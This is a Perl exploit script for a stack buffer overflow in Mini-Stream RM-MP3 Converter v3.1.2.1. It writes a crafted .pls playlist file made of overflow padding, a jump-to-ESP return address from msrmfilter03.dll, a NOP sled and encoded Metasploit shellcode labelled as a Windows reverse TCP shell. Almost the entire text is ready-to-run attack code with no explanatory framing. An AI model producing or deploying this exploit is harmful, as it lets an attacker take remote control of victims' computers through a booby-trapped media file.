#Mini-Stream RM-MP3 Converter v3.1.2.1 (.pls) Stack Buffer Overflow
universal
#By Madjix (lemail ma3andkoum madirou bih)
#Sec4ever.com
my $junk="http://"."\x41" x 17425;
my $ret = "\xCF\xDA\x05\x10"; #jump to ESP - from msrmfilter03.dll
my $padding = "\x90" x 24;
# windows/shell_reverse_tcp - 739 bytes
# http://www.metasploit.com
my $shellcode =
"\x56\x54\x58\x36\x33\x30\x56\x58\x48\x34\x39\x48\x48\x48" .
"\x50\x68\x59\x41\x41\x51\x68\x5a\x59\x59\x59\x59\x41\x41" .
"\x51\x51\x44\x44\x44\x64\x33\x36\x46\x46\x46\x46\x54\x58" .
"\x56\x6a\x30\x50\x50\x54\x55\x50\x50\x61\x33\x30\x31\x30" .
"\x38\x39\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41" .
"\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42" .
"\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x4a" .
"\x48\x4f\x79\x47\x70\x47\x70\x45\x50\x45\x30\x4e\x69\x48" .
"\x65\x50\x31\x4a\x72\x51\x74\x4c\x4b\x42\x72\x44\x70\x4e" .
"\x6b\x46\x32\x44\x4c\x4c\x4b\x51\x42\x45\x44\x4e\x6b\x51" .
"\x62\x47\x58\x44\x4f\x48\x37\x50\x4a\x46\x46\x50\x31\x49" .
"\x6f\x45\x61\x4b\x70\x4e\x4c\x45\x6c\x43\x51\x43\x4c\x45" .
"\x52\x46\x4c\x45\x70\x49\x51\x48\x4f\x44\x4d\x47\x71\x4f" .
"\x37\x48\x62\x48\x70\x46\x32\x42\x77\x4e\x6b\x42\x72\x46" .
"\x70\x4c\x4b\x51\x52\x45\x6c\x43\x31\x4a\x70\x4c\x4b\x47" .
"\x30\x50\x78\x4b\x35\x49\x50\x51\x64\x43\x7a\x46\x61\x4a" .
"\x70\x46\x30\x4c\x4b\x47\x38\x47\x68\x4e\x6b\x43\x68\x47" .
"\x50\x45\x51\x4a\x73\x4a\x43\x47\x4c\x51\x59\x4c\x4b\x50" .
"\x34\x4c\x4b\x47\x71\x48\x56\x44\x71\x49\x6f\x46\x51\x4f" .
"\x30\x4c\x6c\x49\x51\x48\x4f\x44\x4d\x46\x61\x4f\x37\x46" .
"\x58\x49\x70\x50\x75\x49\x64\x43\x33\x43\x4d\x49\x68\x45" .
"\x6b\x43\x4d\x51\x34\x50\x75\x4a\x42\x51\x48\x4e\x6b\x50" .
"\x58\x51\x34\x43\x31\x4a\x73\x43\x56\x4e\x6b\x44\x4c\x42" .
"\x6b\x4e\x6b\x51\x48\x45\x4c\x47\x71\x48\x53\x4e\x6b\x45" .
"\x54\x4e\x6b\x45\x51\x4a\x70\x4c\x49\x51\x54\x45\x74\x45" .
"\x74\x43\x6b\x51\x4b\x51\x71\x50\x59\x43\x6a\x46\x31\x49" .
"\x6f\x49\x70\x50\x58\x43\x6f\x42\x7a\x4e\x6b\x44\x52\x4a" .
"\x4b\x4f\x76\x51\x4d\x51\x78\x45\x63\x50\x32\x47\x70\x47" .
"\x70\x50\x68\x51\x67\x44\x33\x46\x52\x51\x4f\x50\x54\x50" .
"\x68\x42\x6c\x50\x77\x47\x56\x47\x77\x4b\x4f\x4a\x75\x4e" .
"\x58\x4e\x70\x46\x61\x45\x50\x47\x70\x46\x49\x4f\x34\x50" .
"\x54\x46\x30\x50\x68\x46\x49\x4d\x50\x50\x6b\x45\x50\x49" .
"\x6f\x4b\x65\x50\x50\x42\x70\x42\x70\x42\x70\x47\x30\x50" .
"\x50\x43\x70\x46\x30\x43\x58\x4a\x4a\x44\x4f\x49\x4f\x4b" .
"\x50\x4b\x4f\x48\x55\x4f\x79\x49\x57\x43\x58\x49\x50\x4d" .
"\x78\x47\x71\x47\x71\x43\x58\x46\x62\x43\x30\x42\x31\x51" .
"\x4c\x4c\x49\x4d\x36\x43\x5a\x46\x70\x42\x76\x42\x77\x45" .
"\x38\x4a\x39\x4d\x75\x44\x34\x51\x71\x4b\x4f\x4e\x35\x51" .
"\x78\x43\x53\x50\x6d\x45\x34\x43\x30\x4b\x39\x48\x63\x50" .
"\x57\x43\x67\x46\x37\x50\x31\x4b\x46\x51\x7a\x46\x72\x42" .
"\x79\x43\x66\x4d\x32\x49\x6d\x45\x36\x4f\x37\x50\x44\x46" .
"\x44\x47\x4c\x46\x61\x46\x61\x4c\x4d\x43\x74\x44\x64\x42" .
"\x30\x4a\x66\x47\x70\x51\x54\x51\x44\x42\x70\x46\x36\x42" .
"\x76\x51\x46\x43\x76\x46\x36\x50\x4e\x51\x46\x43\x66\x51" .
"\x43\x50\x56\x51\x78\x42\x59\x48\x4c\x45\x6f\x4b\x36\x49" .
"\x6f\x4e\x35\x4e\x69\x4b\x50\x50\x4e\x43\x66\x51\x56\x4b" .
"\x4f\x46\x50\x50\x68\x46\x68\x4e\x67\x47\x6d\x45\x30\x4b" .
"\x4f\x49\x45\x4f\x4b\x4a\x50\x4c\x75\x4d\x72\x43\x66\x43" .
"\x58\x4d\x76\x4e\x75\x4f\x4d\x4d\x4d\x4b\x4f\x4a\x75\x47" .
"\x4c\x43\x36\x43\x4c\x44\x4a\x4d\x50\x4b\x4b\x4d\x30\x43" .
"\x45\x47\x75\x4f\x4b\x50\x47\x46\x73\x44\x32\x50\x6f\x42" .
"\x4a\x47\x70\x46\x33\x49\x6f\x4a\x75\x41\x41";
open(MYFILE,'>>Sec4Ever.pls');
print MYFILE $junk.$ret.$padding.$shellcode;
close(MYFILE);
